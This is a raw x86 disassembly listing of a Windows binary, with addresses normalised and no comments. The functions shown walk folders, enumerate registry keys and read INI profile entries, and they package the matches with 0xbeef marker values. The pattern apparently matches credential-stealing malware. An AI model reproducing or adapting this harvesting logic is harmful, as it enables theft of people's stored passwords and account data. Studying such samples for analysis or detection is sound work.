cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40832d
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_40803a
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_40803a
cmp [ ebp - 0x1c ] 0x1
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40832d
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax 0x0
pop esi
leave
retn 0x8
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_401364
mov esi eax
jmp r-xdata
mov eax 0x0
pop esi
leave
retn 0x8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
leave
retn 0x8
or esi esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_40149f
cmp eax [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x4 ] 0x6
jb r-xdata
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_4081eb
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_4081eb
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_4081eb
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_401364
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_40803a
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_40803a
push [ ebp - 0x10 ]
call sub_401835
push [ ebp - 0x14 ]
call sub_401835
push [ ebp - 0x18 ]
call sub_401835
dec esi
cmp [ ebp - 0x14 ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push rw-data
push [ ebp - 0x10 ]
call StrStrIA
or eax eax
jne r-xdata
or eax eax
je r-xdata
push rw-data
push [ ebp - 0x10 ]
call StrStrIA
or eax eax
jne r-xdata
push 0xbeef0000
push [ ebp + 0xc ]
call sub_4014e6
push [ ebp - 0x10 ]
push [ ebp + 0xc ]
call sub_401548
push [ ebp - 0x14 ]
push [ ebp + 0xc ]
call sub_401548
push [ ebp - 0x18 ]
push [ ebp + 0xc ]
call sub_401548
push rw-data
push [ ebp - 0x10 ]
call StrStrIA
sub_4086e1
push ebp
mov ebp esp
add esp 0xfffffffc
push [ ebp + 0xc ]
call sub_403f04
or eax eax
jne r-xdata
leave
retn 0x8
lea eax [ ebp - 0x4 ]
push eax
call sub_401000
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
call sub_40120d
or eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_401021
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_40849d
or eax eax
jne r-xdata
sub_408726
push ebp
mov ebp esp
add esp 0xfffffeb4
mov [ ebp - 0x148 ] 0x0
mov eax [ ebp + 0xc ]
or eax eax
je r-xdata
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
push [ ebp - 0x148 ]
call sub_401835
leave
retn 0xc
push [ ebp + 0xc ]
call sub_402526
or eax eax
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push rw-data
push [ ebp + 0xc ]
call sub_401d75
jmp r-xdata
lea edx [ ebp - 0x13e ]
test [ edx ] 0x10
je r-xdata
mov [ ebp - 0x148 ] eax
push 0x13e
lea eax [ ebp - 0x13e ]
push eax
call sub_401863
lea eax [ ebp - 0x13e ]
push eax
push [ ebp - 0x148 ]
call FindFirstFileA
mov [ ebp - 0x144 ] eax
inc eax
je r-xdata
lea eax [ edx + 0x2c ]
mov [ ebp - 0x14c ] eax
push [ ebp + 0x10 ]
push [ ebp - 0x14c ]
call StrStrIA
or eax eax
je r-xdata
lea eax [ edx + 0x2c ]
push eax
push rw-data
call lstrcmpiA
or eax eax
jne r-xdata
lea eax [ ebp - 0x13e ]
push eax
push [ ebp - 0x144 ]
call FindNextFileA
test eax eax
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push [ ebp - 0x14c ]
push eax
call sub_401dc9
push eax
push eax
push [ ebp + 0x8 ]
call sub_4086e1
call sub_401835
lea edx [ ebp - 0x13e ]
lea eax [ edx + 0x2c ]
push eax
push rw-data
call lstrcmpiA
or eax eax
jne r-xdata
jmp r-xdata
push [ ebp - 0x144 ]
call FindClose
push [ ebp + 0xc ]
call sub_402526
or eax eax
jne r-xdata
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
call sub_401d75
push rw-data
push [ ebp + 0xc ]
call sub_401d75
jmp r-xdata
lea edx [ ebp - 0x13e ]
lea edx [ edx + 0x2c ]
push edx
push eax
call sub_401dc9
push eax
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_408726
call sub_401835
jmp r-xdata
sub_4088aa
push ebp
mov ebp esp
add esp 0xfffffeb0
mov [ ebp - 0x148 ] 0x0
mov eax [ ebp + 0xc ]
or eax eax
je r-xdata
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
push [ ebp - 0x148 ]
call sub_401835
leave
retn 0x8
push rw-data
push [ ebp + 0xc ]
call sub_401d75
mov [ ebp - 0x148 ] eax
push 0x13e
lea eax [ ebp - 0x13e ]
push eax
call sub_401863
lea eax [ ebp - 0x13e ]
push eax
push [ ebp - 0x148 ]
call FindFirstFileA
mov [ ebp - 0x144 ] eax
inc eax
je r-xdata
lea edx [ ebp - 0x13e ]
test [ edx ] 0x10
je r-xdata
lea eax [ ebp - 0x13e ]
push eax
push [ ebp - 0x144 ]
call FindNextFileA
test eax eax
jne r-xdata
lea edx [ ebp - 0x13e ]
lea eax [ edx + 0x2c ]
push eax
push rw-data
call lstrcmpiA
or eax eax
jne r-xdata
push [ ebp - 0x144 ]
call FindClose
lea edx [ ebp - 0x13e ]
lea eax [ edx + 0x2c ]
push eax
push rw-data
call lstrcmpiA
or eax eax
jne r-xdata
jmp r-xdata
lea edx [ ebp - 0x13e ]
lea eax [ edx + 0x2c ]
mov [ ebp - 0x14c ] eax
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push [ ebp - 0x14c ]
push eax
call sub_401dc9
mov [ ebp - 0x150 ] eax
push eax
push rw-data
push [ ebp - 0x150 ]
call StrStrIA
or eax eax
je r-xdata
jmp r-xdata
call sub_401835
push rw-data
push [ ebp - 0x150 ]
push [ ebp + 0x8 ]
call sub_408726
sub_4089e6
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x8
push eax
push eax
push [ ebp + 0x8 ]
call sub_4088aa
call sub_401835
sub_408a08
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x21
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x1a
push [ ebp + 0x8 ]
call sub_4089e6
push 0x23
push [ ebp + 0x8 ]
call sub_4089e6
push 0x1c
push [ ebp + 0x8 ]
call sub_4089e6
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push eax
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_408726
call sub_401835
push 0x0
push 0x0
push rw-data
push 0x80000000
call sub_401cee
or eax eax
je r-xdata
push eax
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_408726
call sub_401835
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push eax
push eax
call sub_4023a8
or eax eax
je r-xdata
call sub_401835
push eax
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_408726
call sub_401835
sub_408ae3
push ebp
mov ebp esp
add esp 0xfffff7ec
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0x10 ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x810 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x814 ] eax
cmp [ ebp - 0x814 ] 0x0
je r-xdata
jmp r-xdata
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_408ae3
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
push 0xbeef0001
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_403e08
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
sub_408bd2
push ebp
mov ebp esp
add esp 0xfffff7e8
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0x10 ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x810 ] eax
call sub_401835
push 0x0
push 0x0
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push [ ebp - 0x814 ]
call sub_4023a8
or eax eax
je r-xdata
jmp r-xdata
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x810 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_408bd2
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
push eax
mov [ ebp - 0x818 ] eax
push [ ebp - 0x818 ]
call sub_401efb
or eax eax
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
call sub_401835
push 0xbeef0002
push rw-data
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_404116
push 0xbeef0002
push rw-data
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_404116
push 0xbeef0000
push rw-data
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_404116
sub_408d14
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x22
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_408ae3
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_408ae3
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_408bd2
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_408bd2
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_408d98
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x8
push rw-data
push eax
call sub_401dc9
push eax
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
pop eax
push 0xbeef0001
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_408de4
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x23
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x1a
push [ ebp + 0x8 ]
call sub_408d98
push 0x23
push [ ebp + 0x8 ]
call sub_408d98
push 0x1c
push [ ebp + 0x8 ]
call sub_408d98
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_408e26
push ebp
mov ebp esp
push ebx
mov [ rw-data ] 0x0
sub ebx ebx
push [ ebp + 0x8 ]
call lstrlenA
mov edx [ ebp + 0x8 ]
cmp eax 0x2
jbe r-xdata
push [ ebp + 0xc ]
call SetCurrentDirectoryA
push rw-data
push rw-data
call sub_402453
or eax eax
je r-xdata
add edx eax
sub edx 0x2
cmp [ edx ] 0x5c5c
jne r-xdata
mov eax ebx
pop ebx
leave
retn 0x8
push [ ebp + 0x8 ]
call [ rw-data ]
add esp 0x4
or eax eax
jne r-xdata
mov [ edx ] 0x5c
call [ rw-data ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x1
push [ rw-data ]
call [ rw-data ]
add esp 0xc
or eax eax
je r-xdata
call [ rw-data ]
jmp r-xdata
inc ebx
push [ rw-data ]
call [ rw-data ]
add esp 0x4
call [ rw-data ]
mov [ rw-data ] 0x0
jmp r-xdata
sub_408f07
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov eax [ ebp + 0x8 ]
or eax eax
je r-xdata
sub eax eax
pop ebx
leave
retn 0x8
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
cmp [ eax ] 0x7e
je r-xdata
cmp [ eax ] 0x7e
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub ebx ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
push 0x0
call [ rw-data ]
add esp 0x10
or eax eax
je r-xdata
mov edx [ ebp + 0xc ]
dec edx
and edx 0x3
or edx edx
jne r-xdata
sub eax eax
pop ebx
leave
retn 0x8
mov eax ebx
pop ebx
leave
retn 0x8
mov [ ebp - 0x4 ] eax
push 0xc
lea eax [ ebp - 0x10 ]
push eax
call sub_401863
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x4 ]
call [ rw-data ]
add esp 0xc
or eax eax
jne r-xdata
sub eax eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push 0x1
push [ ebp - 0x4 ]
call [ rw-data ]
add esp 0x8
lea eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
leave
retn 0x8
dec [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
add eax 0x400
shl eax 0x2
push eax
call sub_40184c
push eax
mov edx [ ebp + 0x8 ]
inc edx
push eax
push [ ebp + 0xc ]
push edx
call sub_402616
pop eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call [ rw-data ]
add esp 0x8
mov eax [ eax + 0x8 ]
inc eax
push eax
call sub_40184c
mov ebx eax
lea eax [ ebp - 0x10 ]
push [ eax + 0x8 ]
push ebx
push [ eax + 0x4 ]
call sub_401883
sub_409004
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
add esp 0x8
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
add esp 0x8
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
pop eax
leave
retn 0xc
sub_409030
push ebp
mov ebp esp
add esp 0xffffffe8
push [ ebp + 0xc ]
call sub_401eb3
or eax eax
jne r-xdata
push [ ebp + 0xc ]
call sub_403f04
or eax eax
je r-xdata
leave
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_408e26
or eax eax
jne r-xdata
leave
retn 0x10
push rw-data
push rw-data
call sub_402453
or eax eax
jne r-xdata
leave
retn 0x10
or eax eax
je r-xdata
push rw-data
push rw-data
call sub_402453
call sub_408ede
leave
retn 0x10
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
call [ rw-data ]
add esp 0x8
or eax eax
jne r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xffffffff
push rw-data
push [ ebp - 0x4 ]
call [ rw-data ]
add esp 0x14
or eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ rw-data ]
add esp 0x4
push [ ebp - 0x8 ]
call [ rw-data ]
add esp 0x4
cmp eax 0x64
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x0
push [ ebp - 0x8 ]
call sub_409004
or eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push eax
mov edx [ ebp - 0xc ]
inc edx
push edx
call sub_40184c
pop edx
mov [ ebp - 0x18 ] eax
push [ ebp - 0xc ]
push [ ebp - 0x18 ]
push edx
call sub_401883
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
push rw-data
call lstrlenA
push eax
push rw-data
push [ ebp - 0x18 ]
call StrCmpNIA
or eax eax
je r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
push rw-data
call lstrlenA
push eax
push rw-data
push [ ebp - 0x18 ]
call StrCmpNIA
jmp r-xdata
or eax eax
je r-xdata
push rw-data
call lstrlenA
push eax
push rw-data
push [ ebp - 0x18 ]
call StrCmpNIA
or eax eax
jne r-xdata
sub eax eax
push rw-data
call lstrlenA
push eax
push rw-data
push [ ebp - 0x18 ]
call StrCmpNIA
jmp r-xdata
push [ ebp - 0x10 ]
call sub_401835
push [ ebp - 0x14 ]
call sub_401835
push [ ebp - 0x18 ]
call sub_401835
lea eax [ ebp - 0xc ]
push eax
push 0x1
push [ ebp - 0x8 ]
call sub_409004
push [ ebp - 0xc ]
push eax
call sub_408f07
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x2
push [ ebp - 0x8 ]
call sub_409004
push [ ebp - 0xc ]
push eax
call sub_408f07
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_401548
sub_409261
push ebp
mov ebp esp
push ebx
push 0x0
push [ ebp + 0x8 ]
call sub_401d75
mov ebx eax
push ebx
call lstrlenA
or eax eax
je r-xdata
mov eax ebx
pop ebx
leave
retn 0x4
add eax ebx
dec eax
jmp r-xdata
cmp eax ebx
jae r-xdata
cmp [ eax ] 0xd
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
cmp [ eax ] 0xa
jne r-xdata
dec eax
jmp r-xdata
sub_40929d
push ebp
mov ebp esp
add esp 0xffffffb4
push edi
push [ ebp + 0xc ]
call sub_401eb3
or eax eax
jne r-xdata
push [ ebp + 0xc ]
call sub_403f04
or eax eax
je r-xdata
pop edi
leave
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_408e26
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_401f7a
or eax eax
je r-xdata
pop edi
leave
retn 0x10
call sub_408ede
pop edi
leave
retn 0x10
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_402564
or eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_40200e
mov [ ebp - 0x14 ] eax
mov edi eax
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x14 ]
call sub_401835
push edi
call sub_409261
mov [ ebp - 0x30 ] eax
push [ ebp - 0x30 ]
push rw-data
call lstrcmpA
push eax
push [ ebp - 0x30 ]
push rw-data
call lstrcmpA
push eax
push [ ebp - 0x30 ]
push rw-data
call lstrcmpA
pop edx
pop ecx
or eax eax
je r-xdata
or ecx ecx
jne r-xdata
or edx edx
je r-xdata
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x4c ] 0x1
jmp r-xdata
or ecx ecx
jne r-xdata
mov [ ebp - 0x18 ] 0x0
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push [ ebp - 0x30 ]
call sub_401835
push edi
call sub_409261
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
push rw-data
push [ ebp - 0x34 ]
call lstrcmpA
or eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x2
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
push [ ebp - 0x34 ]
call sub_401835
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
mov [ ebp - 0x18 ] 0x1
jmp r-xdata
cmp [ ebp - 0x18 ] 0x3
jne r-xdata
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x4
jne r-xdata
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
push rw-data
push [ ebp - 0x34 ]
call lstrcmpA
or eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x5
jne r-xdata
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
push rw-data
push [ ebp - 0x34 ]
call lstrcmpA
or eax eax
jne r-xdata
mov [ ebp - 0x18 ] 0x1
cmp [ ebp - 0x18 ] 0x6
jne r-xdata
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov [ ebp - 0x18 ] 0x2
mov [ ebp - 0x18 ] 0x2
mov [ ebp - 0x18 ] 0x6
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
push rw-data
call lstrlenA
push eax
push rw-data
push [ ebp - 0x40 ]
call StrCmpNIA
or eax eax
je r-xdata
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x44 ] 0x0
mov [ ebp - 0x48 ] 0x0
push [ ebp - 0x1c ]
call sub_409261
mov [ ebp - 0x40 ] eax
push [ ebp - 0x24 ]
call sub_409261
mov [ ebp - 0x38 ] eax
push [ ebp - 0x2c ]
call sub_409261
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
jne r-xdata
sub eax eax
push rw-data
call lstrlenA
push eax
push rw-data
push [ ebp - 0x40 ]
call StrCmpNIA
jmp r-xdata
or eax eax
je r-xdata
push rw-data
call lstrlenA
push eax
push rw-data
push [ ebp - 0x40 ]
call StrCmpNIA
push [ ebp - 0x40 ]
call sub_401835
push [ ebp - 0x38 ]
call sub_401835
push [ ebp - 0x3c ]
call sub_401835
push [ ebp - 0x44 ]
call sub_401835
push [ ebp - 0x48 ]
call sub_401835
jmp r-xdata
push [ ebp - 0x38 ]
call lstrlenA
push eax
push [ ebp - 0x38 ]
call sub_408f07
mov [ ebp - 0x44 ] eax
push [ ebp - 0x3c ]
call lstrlenA
push eax
push [ ebp - 0x3c ]
call sub_408f07
mov [ ebp - 0x48 ] eax
cmp [ ebp - 0x40 ] 0x0
je r-xdata
or eax eax
jne r-xdata
push rw-data
call lstrlenA
push eax
push rw-data
push [ ebp - 0x40 ]
call StrCmpNIA
jmp r-xdata
cmp [ ebp - 0x48 ] 0x0
je r-xdata
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x40 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x44 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x48 ]
push [ ebp + 0x8 ]
call sub_401548
sub_4095f7
push ebp
mov ebp esp
add esp 0xfffffeb4
mov [ ebp - 0x148 ] 0x0
mov eax [ ebp + 0x14 ]
or eax eax
je r-xdata
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
push [ ebp - 0x148 ]
call sub_401835
leave
retn 0x10
push [ ebp + 0x14 ]
call sub_402526
or eax eax
jne r-xdata
push rw-data
push [ ebp + 0x14 ]
call sub_401d75
push rw-data
push [ ebp + 0x14 ]
call sub_401d75
jmp r-xdata
lea edx [ ebp - 0x13e ]
test [ edx ] 0x10
je r-xdata
mov [ ebp - 0x148 ] eax
push 0x13e
lea eax [ ebp - 0x13e ]
push eax
call sub_401863
lea eax [ ebp - 0x13e ]
push eax
push [ ebp - 0x148 ]
call FindFirstFileA
mov [ ebp - 0x144 ] eax
inc eax
je r-xdata
lea eax [ edx + 0x2c ]
mov [ ebp - 0x14c ] eax
cmp [ rw-data ] 0x3
jne r-xdata
lea eax [ edx + 0x2c ]
push eax
push rw-data
call lstrcmpiA
or eax eax
jne r-xdata
push rw-data
push [ ebp - 0x14c ]
call StrStrIA
or eax eax
je r-xdata
push rw-data
push [ ebp - 0x14c ]
call StrStrIA
or eax eax
je r-xdata
lea edx [ ebp - 0x13e ]
lea eax [ edx + 0x2c ]
push eax
push rw-data
call lstrcmpiA
or eax eax
jne r-xdata
jmp r-xdata
push [ ebp - 0x14c ]
call lstrlenA
cmp eax 0x2
jb r-xdata
push rw-data
push [ ebp + 0x14 ]
call sub_401d75
push [ ebp - 0x14c ]
push eax
call sub_401dc9
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_409030
call sub_401835
jmp r-xdata
push rw-data
push [ ebp + 0x14 ]
call sub_401d75
push [ ebp - 0x14c ]
push eax
call sub_401dc9
push eax
push 0xbeef0001
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
push [ ebp + 0x14 ]
call sub_402526
or eax eax
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x13e ]
push eax
push [ ebp - 0x144 ]
call FindNextFileA
test eax eax
jne r-xdata
push rw-data
push [ ebp - 0x14c ]
call StrStrIA
push eax
push rw-data
push [ ebp - 0x14c ]
call StrStrIA
push eax
push rw-data
push [ ebp - 0x14c ]
call StrStrIA
pop edx
pop ecx
or eax eax
jne r-xdata
mov edx [ ebp - 0x14c ]
add edx eax
sub edx 0x2
cmp [ edx ] 0x732e
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
call sub_401d75
push rw-data
push [ ebp + 0x14 ]
call sub_401d75
jmp r-xdata
push [ ebp - 0x144 ]
call FindClose
push rw-data
push [ ebp + 0x14 ]
call sub_401d75
push [ ebp - 0x14c ]
push eax
call sub_401dc9
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_40929d
call sub_401835
or edx edx
jne r-xdata
jmp r-xdata
lea edx [ ebp - 0x13e ]
lea edx [ edx + 0x2c ]
push edx
push eax
call sub_401dc9
push eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4095f7
call sub_401835
jmp r-xdata
or ecx ecx
je r-xdata
sub_409886
push ebp
mov ebp esp
add esp 0xfffffff0
push edi
push [ ebp + 0xc ]
call sub_401efb
or eax eax
jne r-xdata
push [ ebp + 0x10 ]
call sub_401efb
or eax eax
jne r-xdata
pop edi
leave
retn 0xc
push [ ebp + 0xc ]
call sub_402526
or eax eax
jne r-xdata
pop edi
leave
retn 0xc
push 0x0
push [ ebp + 0xc ]
call sub_401d75
push rw-data
push [ ebp + 0xc ]
call sub_401d75
jmp r-xdata
push [ ebp - 0xc ]
call sub_401835
push [ ebp - 0x10 ]
call sub_401835
push [ ebp - 0x8 ]
call sub_401835
push [ ebp - 0x4 ]
call sub_401835
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40986e
pop edi
leave
retn 0xc
push [ ebp - 0x8 ]
push 0xfde8
push [ ebp - 0x4 ]
call GetPrivateProfileSectionNamesA
cmp eax 0x2
jbe r-xdata
mov [ ebp - 0xc ] eax
push rw-data
push [ ebp - 0xc ]
call sub_401d75
mov [ ebp - 0x8 ] eax
push 0xfdea
call sub_40184c
mov [ ebp - 0x4 ] eax
push 0x1000
call sub_40184c
mov [ ebp - 0x10 ] eax
push [ ebp - 0x8 ]
call sub_401eb3
or eax eax
je r-xdata
mov edi [ ebp - 0x4 ]
cmp [ edi ] 0x0
je r-xdata
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push [ ebp - 0x8 ]
push 0xfff
push [ ebp - 0x10 ]
push rw-data
push rw-data
push edi
call GetPrivateProfileStringA
or eax eax
je r-xdata
push [ ebp - 0x8 ]
push 0x1
push rw-data
push edi
call GetPrivateProfileIntA
cmp eax 0x1
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call sub_40986e
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
call sub_401d75
push eax
mov edx eax
jmp r-xdata
or edx edx
je r-xdata
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_40986e
call sub_401835
